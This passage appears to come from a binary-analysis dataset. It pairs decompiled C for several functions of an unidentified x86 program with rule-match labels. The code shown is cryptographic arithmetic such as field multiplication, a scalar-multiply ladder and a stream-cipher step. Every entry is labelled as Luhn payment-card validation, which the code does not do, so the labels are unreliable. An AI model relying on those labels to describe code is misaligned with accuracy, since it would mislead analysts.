arg_8h[0x1d] = uVar1 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[0xe], arg_ch[0xe] >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    iVar3 = fcn.00410d10(arg_ch[0xc], arg_ch[0xc] >> 0x1f, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    uVar1 = fcn.00410d10(iVar2 + iVar3, 2, 0);\n    arg_8h[0x1e] = uVar1;\n    arg_8h[0x1f] = uVar1 >> 0x20;\n    iVar2 = fcn.00410d10(arg_ch[0x10], arg_ch[0x10] >> 0x1f, arg_ch[0x10], arg_ch[0x10] >> 0x1f);\n    uVar1 = fcn.00410d10(arg_ch[0xe], arg_ch[0xe] >> 0x1f, 4, 0);\n    iVar3 = fcn.00410d10(uVar1, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    arg_8h[0x20] = iVar2 + iVar3;\n    arg_8h[0x21] = iVar2 + iVar3 >> 0x20;\n    uVar1 = fcn.00410d10(arg_ch[0x10], arg_ch[0x10] >> 0x1f, 2, 0);\n    uVar1 = fcn.00410d10(uVar1, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    arg_8h[0x22] = uVar1;\n    arg_8h[0x23] = uVar1 >> 0x20;\n    uVar1 = fcn.00410d10(arg_ch[0x12], arg_ch[0x12] >> 0x1f, 2, 0);\n    uVar1 = fcn.00410d10(uVar1, arg_ch[0x12], arg_ch[0x12] >> 0x1f);\n    arg_8h[0x24] = uVar1;\n    arg_8h[0x25] = uVar1 >> 0x20;\n    return;\n}\n",
        "token_count": 4047
    },
    "00404d90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d90(uint32_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar1 = *arg_ch;\n    uVar2 = fcn.00410d50();\n    uVar3 = fcn.00410d50();\n    uVar4 = fcn.00410d50();\n    *arg_8h = (uVar1 | uVar2 | uVar3 | uVar4) & 0x3ffffff;\n    arg_8h[1] = 0;\n    fcn.00410d50();\n    fcn.00410d50();\n    fcn.00410d50();\n    uVar2 = fcn.00410d70();\n    arg_8h[2] = uVar2 & 0x1ffffff;\n    arg_8h[3] = 0;\n    fcn.00410d50();\n    fcn.00410d50();\n    fcn.00410d50();\n    uVar2 = fcn.00410d70();\n    arg_8h[4] = uVar2 & 0x3ffffff;\n    arg_8h[5] = 0;\n    fcn.00410d50();\n    fcn.00410d50();\n    fcn.00410d50();\n    uVar2 = fcn.00410d70();\n    arg_8h[6] = uVar2 & 0x1ffffff;\n    arg_8h[7] = 0;\n    fcn.00410d50();\n    fcn.00410d50();\n    fcn.00410d50();\n    uVar2 = fcn.00410d70();\n    arg_8h[8] = uVar2 & 0x3ffffff;\n    arg_8h[9] = 0;\n    uVar1 = arg_ch[0x10];\n    uVar2 = fcn.00410d50();\n    uVar3 = fcn.00410d50();\n    uVar4 = fcn.00410d50();\n    arg_8h[10] = (uVar1 | uVar2 | uVar3 | uVar4) & 0x1ffffff;\n    arg_8h[0xb] = 0;\n    fcn.00410d50();\n    fcn.00410d50();\n    fcn.00410d50();\n    uVar2 = fcn.00410d70();\n    arg_8h[0xc] = uVar2 & 0x3ffffff;\n    arg_8h[0xd] = 0;\n    fcn.00410d50();\n    fcn.00410d50();\n    fcn.00410d50();\n    uVar2 = fcn.00410d70();\n    arg_8h[0xe] = uVar2 & 0x1ffffff;\n    arg_8h[0xf] = 0;\n    fcn.00410d50();\n    fcn.00410d50();\n    fcn.00410d50();\n    uVar2 = fcn.00410d70();\n    arg_8h[0x10] = uVar2 & 0x3ffffff;\n    arg_8h[0x11] = 0;\n    fcn.00410d50();\n    fcn.00410d50();\n    fcn.00410d50();\n    uVar2 = fcn.00410d70();\n    arg_8h[0x12] = uVar2 & 0x1ffffff;\n    arg_8h[0x13] = 0;\n    return;\n}\n",
        "token_count": 833
    },
    "004052f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004052f0(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = ~(arg_8h ^ arg_ch) << 0x10 & ~(arg_8h ^ arg_ch);\n    uVar1 = uVar1 << 8 & uVar1;\n    uVar1 = uVar1 << 4 & uVar1;\n    uVar1 = uVar1 << 2 & uVar1;\n    return (uVar1 << 1 & uVar1) >> 0x1f;\n}\n",
        "token_count": 136
    },
    "00406160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_500h\n\nvoid __cdecl fcn.00406160(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t arg_10h_00;\n    uint32_t var_500h;\n    uint var_4fch;\n    uint var_4f8h;\n    uint *var_4f4h;\n    uint *var_4f0h;\n    uint *var_4ech;\n    uint *var_4e8h;\n    uint *var_4e4h;\n    uint32_t var_4e0h;\n    uint *var_4dch;\n    uint *var_4d8h;\n    uint *var_4d4h;\n    uint var_4d0h;\n    int32_t var_4cch;\n    uint8_t var_4c5h;\n    uint var_4c4h;\n    uint auStack1220 [37];\n    uint var_42ch;\n    uint auStack1068 [37];\n    uint var_394h;\n    uint auStack916 [37];\n    uint var_2fch;\n    uint auStack764 [37];\n    uint var_264h;\n    uint auStack612 [37];\n    uint var_1cch;\n    uint32_t auStack460 [37];\n    uint var_134h;\n    uint32_t auStack308 [37];\n    uint var_9ch;\n    uint32_t auStack156 [37];\n    uint32_t var_4h;\n    \n    var_4h = *0x4110a4 ^ &stack0xfffffffc;\n    var_4d4h = &var_2fch;\n    var_4f0h = &var_9ch;\n    var_4d8h = &var_134h;\n    var_4dch = &var_394h;\n    var_4ech = &var_42ch;\n    var_4f4h = &var_1cch;\n    var_4e4h = &var_4c4h;\n    var_4e8h = &var_264h;\n    for (var_4cch = 0; var_4cch < 0x13; var_4cch = var_4cch + 1) {\n        auStack764[var_4cch * 2 + -1] = 0;\n        auStack764[var_4cch * 2] = 0;\n        auStack156[var_4cch * 2 + -1] = 0;\n        auStack156[var_4cch * 2] = 0;\n        auStack308[var_4cch * 2 + -1] = 0;\n        auStack308[var_4cch * 2] = 0;\n        auStack916[var_4cch * 2 + -1] = 0;\n        auStack916[var_4cch * 2] = 0;\n        auStack1068[var_4cch * 2 + -1] = 0;\n        auStack1068[var_4cch * 2] = 0;\n        auStack460[var_4cch * 2 + -1] = 0;\n        auStack460[var_4cch * 2] = 0;\n        auStack1220[var_4cch * 2 + -1] = 0;\n        auStack1220[var_4cch * 2] = 0;\n        auStack612[var_4cch * 2 + -1] = 0;\n        auStack612[var_4cch * 2] = 0;\n    }\n    var_9ch = 1;\n    auStack156[0] = 0;\n    var_134h = 1;\n    auStack308[0] = 0;\n    var_1cch = 1;\n    auStack460[0] = 0;\n    var_264h = 1;\n    auStack612[0] = 0;\n    fcn.00410b50(var_4d4h, arg_14h, 0x50);\n    for (var_4e0h = 0; var_4e0h < 0x20; var_4e0h = var_4e0h + 1) {\n        var_4c5h = *(arg_10h + (0x1f - var_4e0h));\n        for (var_500h = 0; var_500h < 8; var_500h = var_500h + 1) {\n            arg_10h_00 = var_4c5h >> 7;\n            fcn.004060e0(var_4d8h, var_4d4h, arg_10h_00);\n            fcn.004060e0(var_4dch, var_4f0h, arg_10h_00);\n            fcn.00405e10(var_4e4h, var_4e8h, var_4ech, var_4f4h, var_4d8h, var_4dch, var_4d4h, var_4f0h, arg_14h);\n            fcn.004060e0(var_4e4h, var_4ech, arg_10h_00);\n            fcn.004060e0(var_4e8h, var_4f4h, arg_10h_00);\n            puVar1 = var_4e4h;\n            var_4e4h = var_4d8h;\n            puVar2 = var_4e8h;\n            var_4e8h = var_4dch;\n            puVar3 = var_4ech;\n            var_4ech = var_4d4h;\n            puVar4 = var_4f4h;\n            var_4f4h = var_4f0h;\n            var_4c5h = var_4c5h << 1;\n            var_4f0h = puVar4;\n            var_4dch = puVar2;\n            var_4d8h = puVar1;\n            var_4d4h = puVar3;\n        }\n    }\n    fcn.00410b50(arg_8h, var_4d8h, 0x50);\n    fcn.00410b50(arg_ch, var_4dch, 0x50);\n    fcn.00410cf7(var_500h);\n    return;\n}\n",
        "token_count": 1492
    },
    "00407b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407b20(int32_t arg_8h, uint32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_200h;\n    uint var_1fch;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_24h;\n    uint var_4h;\n    \n    uVar3 = *(arg_8h + 0x1080) & 0x1ff;\n    uVar4 = uVar3 + 0x10 & 0x1ff;\n    if (*(arg_8h + 0x1080) < 0x200) {\n        *(arg_8h + 0x1080) = *(arg_8h + 0x1080) + 0x10U & 0x3ff;\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1010) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1010) >> 0x10 & 0xff) * 4);\n        *(arg_8h + uVar3 * 4) =\n             ((*(arg_8h + 4 + uVar3 * 4) >> 0x17 | *(arg_8h + 4 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1034) >> 10 | *(arg_8h + 0x1034) << 0x16)) +\n             (*(arg_8h + 0x1018) >> 8 | *(arg_8h + 0x1018) << 0x18) + *(arg_8h + uVar3 * 4);\n        *(arg_8h + 0x1000) = *(arg_8h + uVar3 * 4);\n        *arg_ch = iVar1 + iVar2 ^ *(arg_8h + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1014) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1014) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 4 + uVar3 * 4) =\n             ((*(arg_8h + 8 + uVar3 * 4) >> 0x17 | *(arg_8h + 8 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1038) >> 10 | *(arg_8h + 0x1038) << 0x16)) +\n             (*(arg_8h + 0x101c) >> 8 | *(arg_8h + 0x101c) << 0x18) + *(arg_8h + 4 + uVar3 * 4);\n        *(arg_8h + 0x1004) = *(arg_8h + 4 + uVar3 * 4);\n        arg_ch[1] = iVar1 + iVar2 ^ *(arg_8h + 4 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1018) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1018) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 8 + uVar3 * 4) =\n             ((*(arg_8h + 0xc + uVar3 * 4) >> 0x17 | *(arg_8h + 0xc + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x103c) >> 10 | *(arg_8h + 0x103c) << 0x16)) +\n             (*(arg_8h + 0x1020) >> 8 | *(arg_8h + 0x1020) << 0x18) + *(arg_8h + 8 + uVar3 * 4);\n        *(arg_8h + 0x1008) = *(arg_8h + 8 + uVar3 * 4);\n        arg_ch[2] = iVar1 + iVar2 ^ *(arg_8h + 8 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x101c) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x101c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0xc + uVar3 * 4) =\n             ((*(arg_8h + 0x10 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x10 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1000) >> 10 | *(arg_8h + 0x1000) << 0x16)) +\n             (*(arg_8h + 0x1024) >> 8 | *(arg_8h + 0x1024) << 0x18) + *(arg_8h + 0xc + uVar3 * 4);\n        *(arg_8h + 0x100c) = *(arg_8h + 0xc + uVar3 * 4);\n        arg_ch[3] = iVar1 + iVar2 ^ *(arg_8h + 0xc + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1020) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1020) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x10 + uVar3 * 4) =\n             ((*(arg_8h + 0x14 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x14 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1004) >> 10 | *(arg_8h + 0x1004) << 0x16)) +\n             (*(arg_8h + 0x1028) >> 8 | *(arg_8h + 0x1028) << 0x18) + *(arg_8h + 0x10 + uVar3 * 4);\n        *(arg_8h + 0x1010) = *(arg_8h + 0x10 + uVar3 * 4);\n        arg_ch[4] = iVar1 + iVar2 ^ *(arg_8h + 0x10 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1024) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1024) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x14 + uVar3 * 4) =\n             ((*(arg_8h + 0x18 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x18 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1008) >> 10 | *(arg_8h + 0x1008) << 0x16)) +\n             (*(arg_8h + 0x102c) >> 8 | *(arg_8h + 0x102c) << 0x18) + *(arg_8h + 0x14 + uVar3 * 4);\n        *(arg_8h + 0x1014) = *(arg_8h + 0x14 + uVar3 * 4);\n        arg_ch[5] = iVar1 + iVar2 ^ *(arg_8h + 0x14 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1028) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1028) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x18 + uVar3 * 4) =\n             ((*(arg_8h + 0x1c + uVar3 * 4) >> 0x17 | *(arg_8h + 0x1c + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x100c) >> 10 | *(arg_8h + 0x100c) << 0x16)) +\n             (*(arg_8h + 0x1030) >> 8 | *(arg_8h + 0x1030) << 0x18) + *(arg_8h + 0x18 + uVar3 * 4);\n        *(arg_8h + 0x1018) = *(arg_8h + 0x18 + uVar3 * 4);\n        arg_ch[6] = iVar1 + iVar2 ^ *(arg_8h + 0x18 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x102c) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x102c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1c + uVar3 * 4) =\n             ((*(arg_8h + 0x20 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x20 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1010) >> 10 | *(arg_8h + 0x1010) << 0x16)) +\n             (*(arg_8h + 0x1034) >> 8 | *(arg_8h + 0x1034) << 0x18) + *(arg_8h + 0x1c + uVar3 * 4);\n        *(arg_8h + 0x101c) = *(arg_8h + 0x1c + uVar3 * 4);\n        arg_ch[7] = iVar1 + iVar2 ^ *(arg_8h + 0x1c + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1030) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1030) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x20 + uVar3 * 4) =\n             ((*(arg_8h + 0x24 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x24 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1014) >> 10 | *(arg_8h + 0x1014) << 0x16)) +\n             (*(arg_8h + 0x1038) >> 8 | *(arg_8h + 0x1038) << 0x18) + *(arg_8h + 0x20 + uVar3 * 4);\n        *(arg_8h + 0x1020) = *(arg_8h + 0x20 + uVar3 * 4);\n        arg_ch[8] = iVar1 + iVar2 ^ *(arg_8h + 0x20 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1034) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1034) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x24 + uVar3 * 4) =\n             ((*(arg_8h + 0x28 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x28 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1018) >> 10 | *(arg_8h + 0x1018) << 0x16)) +\n             (*(arg_8h + 0x103c) >> 8 | *(arg_8h + 0x103c) << 0x18) + *(arg_8h + 0x24 + uVar3 * 4);\n        *(arg_8h + 0x1024) = *(arg_8h + 0x24 + uVar3 * 4);\n        arg_ch[9] = iVar1 + iVar2 ^ *(arg_8h + 0x24 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1038) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1038) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x28 + uVar3 * 4) =\n             ((*(arg_8h + 0x2c + uVar3 * 4) >> 0x17 | *(arg_8h + 0x2c + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x101c) >> 10 | *(arg_8h + 0x101c) << 0x16)) +\n             (*(arg_8h + 0x1000) >> 8 | *(arg_8h + 0x1000) << 0x18) + *(arg_8h + 0x28 + uVar3 * 4);\n        *(arg_8h + 0x1028) = *(arg_8h + 0x28 + uVar3 * 4);\n        arg_ch[10] = iVar1 + iVar2 ^ *(arg_8h + 0x28 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x103c) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x103c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x2c + uVar3 * 4) =\n             ((*(arg_8h + 0x30 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x30 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1020) >> 10 | *(arg_8h + 0x1020) << 0x16)) +\n             (*(arg_8h + 0x1004) >> 8 | *(arg_8h + 0x1004) << 0x18) + *(arg_8h + 0x2c + uVar3 * 4);\n        *(arg_8h + 0x102c) = *(arg_8h + 0x2c + uVar3 * 4);\n        arg_ch[0xb] = iVar1 + iVar2 ^ *(arg_8h + 0x2c + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1000) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1000) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x30 + uVar3 * 4) =\n             ((*(arg_8h + 0x34 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x34 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1024) >> 10 | *(arg_8h + 0x1024) << 0x16)) +\n             (*(arg_8h + 0x1008) >> 8 | *(arg_8h + 0x1008) << 0x18) + *(arg_8h + 0x30 + uVar3 * 4);\n        *(arg_8h + 0x1030) = *(arg_8h + 0x30 + uVar3 * 4);\n        arg_ch[0xc] = iVar1 + iVar2 ^ *(arg_8h + 0x30 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1004) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1004) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x34 + uVar3 * 4) =\n             ((*(arg_8h + 0x38 + uVar3 * 4) >> 0x17 | *(arg_8h + 0x38 + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x1028) >> 10 | *(arg_8h + 0x1028) << 0x16)) +\n             (*(arg_8h + 0x100c) >> 8 | *(arg_8h + 0x100c) << 0x18) + *(arg_8h + 0x34 + uVar3 * 4);\n        *(arg_8h + 0x1034) = *(arg_8h + 0x34 + uVar3 * 4);\n        arg_ch[0xd] = iVar1 + iVar2 ^ *(arg_8h + 0x34 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x1008) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x1008) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x38 + uVar3 * 4) =\n             ((*(arg_8h + 0x3c + uVar3 * 4) >> 0x17 | *(arg_8h + 0x3c + uVar3 * 4) << 9) ^\n             (*(arg_8h + 0x102c) >> 10 | *(arg_8h + 0x102c) << 0x16)) +\n             (*(arg_8h + 0x1010) >> 8 | *(arg_8h + 0x1010) << 0x18) + *(arg_8h + 0x38 + uVar3 * 4);\n        *(arg_8h + 0x1038) = *(arg_8h + 0x38 + uVar3 * 4);\n        arg_ch[0xe] = iVar1 + iVar2 ^ *(arg_8h + 0x38 + uVar3 * 4);\n        iVar1 = *(arg_8h + 0x800 + *(arg_8h + 0x100c) * 4);\n        iVar2 = *(arg_8h + 0xc00 + (*(arg_8h + 0x100c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x3c + uVar3 * 4) =\n             ((*(arg_8h + uVar4 * 4) >> 0x17 | *(arg_8h + uVar4 * 4) << 9) ^\n             (*(arg_8h + 0x1030) >> 10 | *(arg_8h + 0x1030) << 0x16)) +\n             (*(arg_8h + 0x1014) >> 8 | *(arg_8h + 0x1014) << 0x18) + *(arg_8h + 0x3c + uVar3 * 4);\n        *(arg_8h + 0x103c) = *(arg_8h + 0x3c + uVar3 * 4);\n        arg_ch[0xf] = iVar1 + iVar2 ^ *(arg_8h + 0x3c + uVar3 * 4);\n    }\n    else {\n        *(arg_8h + 0x1080) = *(arg_8h + 0x1080) + 0x10U & 0x3ff;\n        iVar1 = *(arg_8h + *(arg_8h + 0x1050) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1050) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x800 + uVar3 * 4) =\n             ((*(arg_8h + 0x804 + uVar3 * 4) >> 9 | *(arg_8h + 0x804 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1074) >> 0x16 | *(arg_8h + 0x1074) << 10)) +\n             (*(arg_8h + 0x1058) >> 0x18 | *(arg_8h + 0x1058) << 8) + *(arg_8h + 0x800 + uVar3 * 4);\n        *(arg_8h + 0x1040) = *(arg_8h + 0x800 + uVar3 * 4);\n        *arg_ch = iVar1 + iVar2 ^ *(arg_8h + 0x800 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1054) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1054) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x804 + uVar3 * 4) =\n             ((*(arg_8h + 0x808 + uVar3 * 4) >> 9 | *(arg_8h + 0x808 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1078) >> 0x16 | *(arg_8h + 0x1078) << 10)) +\n             (*(arg_8h + 0x105c) >> 0x18 | *(arg_8h + 0x105c) << 8) + *(arg_8h + 0x804 + uVar3 * 4);\n        *(arg_8h + 0x1044) = *(arg_8h + 0x804 + uVar3 * 4);\n        arg_ch[1] = iVar1 + iVar2 ^ *(arg_8h + 0x804 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1058) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1058) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x808 + uVar3 * 4) =\n             ((*(arg_8h + 0x80c + uVar3 * 4) >> 9 | *(arg_8h + 0x80c + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x107c) >> 0x16 | *(arg_8h + 0x107c) << 10)) +\n             (*(arg_8h + 0x1060) >> 0x18 | *(arg_8h + 0x1060) << 8) + *(arg_8h + 0x808 + uVar3 * 4);\n        *(arg_8h + 0x1048) = *(arg_8h + 0x808 + uVar3 * 4);\n        arg_ch[2] = iVar1 + iVar2 ^ *(arg_8h + 0x808 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x105c) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x105c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x80c + uVar3 * 4) =\n             ((*(arg_8h + 0x810 + uVar3 * 4) >> 9 | *(arg_8h + 0x810 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1040) >> 0x16 | *(arg_8h + 0x1040) << 10)) +\n             (*(arg_8h + 0x1064) >> 0x18 | *(arg_8h + 0x1064) << 8) + *(arg_8h + 0x80c + uVar3 * 4);\n        *(arg_8h + 0x104c) = *(arg_8h + 0x80c + uVar3 * 4);\n        arg_ch[3] = iVar1 + iVar2 ^ *(arg_8h + 0x80c + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1060) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1060) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x810 + uVar3 * 4) =\n             ((*(arg_8h + 0x814 + uVar3 * 4) >> 9 | *(arg_8h + 0x814 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1044) >> 0x16 | *(arg_8h + 0x1044) << 10)) +\n             (*(arg_8h + 0x1068) >> 0x18 | *(arg_8h + 0x1068) << 8) + *(arg_8h + 0x810 + uVar3 * 4);\n        *(arg_8h + 0x1050) = *(arg_8h + 0x810 + uVar3 * 4);\n        arg_ch[4] = iVar1 + iVar2 ^ *(arg_8h + 0x810 + uVar3 * 4);\n        iVar1 = *(arg_8h + *(arg_8h + 0x1064) * 4);\n        iVar2 = *(arg_8h + 0x400 + (*(arg_8h + 0x1064) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x814 + uVar3 * 4) =\n             ((*(arg_8h + 0x818 + uVar3 * 4) >> 9 | *(arg_8h + 0x818 + uVar3 * 4) << 0x17) ^\n             (*(arg_8h + 0x1048) >> 0x16 | *(arg_8h + 0x1048) << 10)) +\n             (*(arg_8h + 0x106c) >> 0x18 | *(arg_8h + 0x106c) << 8) + *(arg_8h + 0x814 + uVar3 * 4);\n        *(arg_8h + 0x1054) = *(arg_8h + 0x814 + uVar3 * 4);\n        arg_ch[5] = iVar1 + 